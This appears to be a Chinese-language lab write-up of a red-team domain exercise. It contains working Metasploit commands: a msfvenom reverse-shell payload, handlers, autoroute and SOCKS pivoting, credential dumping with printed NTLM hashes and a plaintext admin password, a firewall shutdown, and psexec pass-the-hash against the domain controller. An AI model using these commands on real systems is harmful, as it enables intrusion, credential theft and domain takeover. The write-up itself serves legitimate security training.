**搭建环境**

仅机主网卡:子网ip 192.168.52.0

nat网卡:192.168.161.0

<font style="color:rgb(63, 63, 63);">web服务器: Windows7			52.143</font>

<font style="color:rgb(63, 63, 63);">域内主机：Win2K3 Metasploitable	52.141</font>

<font style="color:rgb(63, 63, 63);">域控：Windows 2008			52.138	161.129</font>

<font style="color:rgb(63, 63, 63);">虚拟机统一密码</font><font style="color:rgb(33, 37, 41);">hongrisec@2019</font>

<font style="color:rgb(33, 37, 41);">更新密码:Woaifengyi7.</font>

<font style="color:rgb(33, 37, 41);">进入web服务器开启 C:\phpStudy\phpStudy.exe  </font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1788941326961-edfe9f96-2456-4e37-82e5-f24b10614f7d.png)

# <font style="color:rgb(33, 37, 41);">getshell</font>
**浏览网页**

php探针页面,找其他入口

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1788941781996-94eb8796-cf81-47a1-b7a8-013a4715d237.png)

**端口服务扫描**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1788941672195-51f2d03d-9c78-4e3c-8717-f692fc1899a3.png)

**目录扫描**

dirb扫描到phpmyadmin页面

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1788942057930-7bc4beb0-b6dd-4614-bcfd-9feb71ed2749.png)

**getshell**

和上一篇方法相同

发现已经是跳板机最高权限,跳过权限提升

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1788951037287-3524c5b4-eec4-46b3-9ed5-5a343905859c.png)

# 搭建通路
**反弹会话**

创建反弹命令

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1788953728648-a58e0d9b-9ef6-4087-a31e-6890dad65ee5.png)

在webshell中执行

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1788953782825-39a734a6-7f8f-46ed-ba81-0bfc996849dc.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1788953793067-92280b1e-161c-4792-ab60-ed3cb1359fb3.png)

**另一种获得会话的方法**

生成木马

```plain
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.161.128 LPORT=4444 -f exe -o /tmp/msf64.exe
```

将生成的exe通过蚁剑上传到目标

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789279923507-49c27089-43fe-4ec1-8228-cee7d7d62d8e.png)

msf开启handler

```plain
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.161.128
set LPORT 4444
run
```

蚁剑执行木马

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789280141651-dc2b95a1-48fc-4af3-9455-3a5d01a394b6.png)

获得会话

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789280154370-028c7f75-5b69-4c71-a6bb-32cf855af39b.png)

**添加msf路由**

查找内网网段

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1788954047329-0b7c9b36-3c51-4a49-bba0-0f7ee18d6593.png)

内网网段是`192.168.52.0/24`

添加路由

```bash
# -s 指定网段
run autoroute -s 192.168.52.0/24

# 自动探测目标所有内网网段并自动添加（懒人一键）
run get_local_subnets
run autoroute -s auto
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1788954190679-858c13a7-b278-4f52-ae09-aa2889eadbaf.png)

**开启代理**

```bash
use auxiliary/server/socks_proxy
set VERSION 5
set SRVHOST 0.0.0.0
set SRVPORT 1088
run -j
```

# 内网信息收集
**获取主机信息**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789280515756-ee035503-c183-459a-a4ba-01e14c7590ec.png)

域名GOD

**fscan扫描**

上传fscan给跳板机

但是由于环境问题,在跳板机执行不了

所以直接在kali上通过代理用fscan扫描

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1788958005769-20d53b0d-8737-4086-a2dc-489881520c83.png)

结果

<font style="color:rgb(15, 17, 21);">192.168.52.0/24 内网扫描结果</font>  
<font style="color:rgb(15, 17, 21);">├── 52.1 网关/宿主机 (Win 11 + IIS 10.0, 开放8080, 极难打)</font>  
<font style="color:rgb(15, 17, 21);">├── 52.138 疑似域控DC (Win 2008 R2, 开放53/88/389/445, 存在SMBv1)极大概率存在 </font>**<font style="color:rgb(15, 17, 21);">MS17-010 </font>**  
<font style="color:rgb(15, 17, 21);">├── 52.141 Windows主机 (开放FTP, 支持匿名登录, 开放445)</font>  
<font style="color:rgb(15, 17, 21);">└── 52.143 Windows主机</font>

**<font style="color:rgb(15, 17, 21);">nmap扫描52.138</font>**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789279020214-15865c78-30f4-4ae6-86f0-cd4bf5968d28.png)

# 横向DC
## 获取凭证
```plain
sessions -i 1

load wiki
creds_all
```

```plain

Username       Domain  LM                                NTLM                              SHA1
--------       ------  --                                ----                              ----
Administrator  GOD     a365227e975e26ac5d2b4d4c6ad2b07d  b09ee0327f95ae09582f74d08eacbeaf  d7805ffe71685f06e64bc280dec30d076da93
                                                                                           0d1
STU1$          GOD                                       5b1cd329c70604363da719e02ca9cf70  b1f9a361b297e9a7ae09d0f3eb18a95ca9a1f
                                                                                           bb1

wdigest credentials
===================

Username       Domain  Password
--------       ------  --------
(null)         (null)  (null)
Administrator  GOD     Woaifengyi7.
STU1$          GOD     b1 db 99 94 e8 17 70 1a 20 7f 7a 96 8d d8 7d 8f d3 41 91 be ec af 87 25 1a 07 89 e6 a0 6c 37 fe 54 c8 20
                       16 a9 fa a0 90 a2 07 c6 dc 3c 9b 4c e8 82 0e 49 e2 51 6f df af c0 c9 77 72 12 f2 ff ea a1 91 40 f0 ec 9a
                       9d eb b3 0d 74 08 c0 a1 a6 c8 0d db ed 20 b1 3b 07 c8 2c 63 2e 45 bb f2 0b e8 64 5d 79 24 f4 58 9a 78 56
                       ef db fb f5 ec 72 85 8c 23 ae 7b 8f 73 a8 66 74 a5 ad 41 94 2d b9 3d fe df b0 41 b7 fe cb 67 70 46 90 32
                       a0 6a 61 4a 1a f1 86 d5 27 41 b5 f3 37 73 ed 8c 57 d7 97 3d 81 43 2d 39 f4 1b 95 f5 9a 91 00 17 64 59 1e
                       05 a1 9a a4 4b 8a c8 e4 0f ac 67 28 8d 2a 41 12 a8 65 fd 1f f5 b1 76 e9 71 b7 01 9e c8 a5 04 68 d5 94 2b
                       52 13 8e af 4c a9 45 c2 3c c1 bf f5 41 b6 82 9e a3 4f 26 32 e6 e5 02 d4 0e 93 b8 9d f0 d0

tspkg credentials
=================

Username       Domain  Password
--------       ------  --------
Administrator  GOD     Woaifengyi7.

kerberos credentials
====================

Username       Domain   Password
--------       ------   --------
(null)         (null)   (null)
Administrator  GOD.ORG  Woaifengyi7.
stu1$          GOD.ORG  b1 db 99 94 e8 17 70 1a 20 7f 7a 96 8d d8 7d 8f d3 41 91 be ec af 87 25 1a 07 89 e6 a0 6c 37 fe 54 c8 20
                         16 a9 fa a0 90 a2 07 c6 dc 3c 9b 4c e8 82 0e 49 e2 51 6f df af c0 c9 77 72 12 f2 ff ea a1 91 40 f0 ec 9
                        a 9d eb b3 0d 74 08 c0 a1 a6 c8 0d db ed 20 b1 3b 07 c8 2c 63 2e 45 bb f2 0b e8 64 5d 79 24 f4 58 9a 78
                        56 ef db fb f5 ec 72 85 8c 23 ae 7b 8f 73 a8 66 74 a5 ad 41 94 2d b9 3d fe df b0 41 b7 fe cb 67 70 46 90
                         32 a0 6a 61 4a 1a f1 86 d5 27 41 b5 f3 37 73 ed 8c 57 d7 97 3d 81 43 2d 39 f4 1b 95 f5 9a 91 00 17 64 5
                        9 1e 05 a1 9a a4 4b 8a c8 e4 0f ac 67 28 8d 2a 41 12 a8 65 fd 1f f5 b1 76 e9 71 b7 01 9e c8 a5 04 68 d5
                        94 2b 52 13 8e af 4c a9 45 c2 3c c1 bf f5 41 b6 82 9e a3 4f 26 32 e6 e5 02 d4 0e 93 b8 9d f0 d0


```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789280655445-a88f6853-a347-407f-977e-7e15ecc8d2c3.png)

获得了域管理员的域账号

### <font style="color:rgb(15, 17, 21);">明文传递＋psexec</font>
**在 Win7 上加 portproxy**

```plain
msf6 > sessions -i 3
meterpreter > shell

netsh interface portproxy add v4tov4 listenport=4445 listenaddress=192.168.52.143 connectport=4445 connectaddress=192.168.161.128
netsh interface portproxy show all
#关闭防火墙
netsh advfirewall set allprofiles state off
```

**kali开启handler**

```plain
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 4445
msf6 exploit(multi/handler) > run -j
```

**psexec 打 DC**

```plain
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.52.138
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass Woaifengyi7.
  #或者hash值aad3b435b51404eeaad3b435b51404ee:b09ee0327f95ae09582f74d08eacbeaf
msf6 exploit(windows/smb/psexec) > set SMBDomain GOD
msf6 exploit(windows/smb/psexec) > set TARGET 2
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set LHOST 192.168.52.143
msf6 exploit(windows/smb/psexec) > set LPORT 4445
msf6 exploit(windows/smb/psexec) > set DisablePayloadHandler true
msf6 exploit(windows/smb/psexec) > run
```

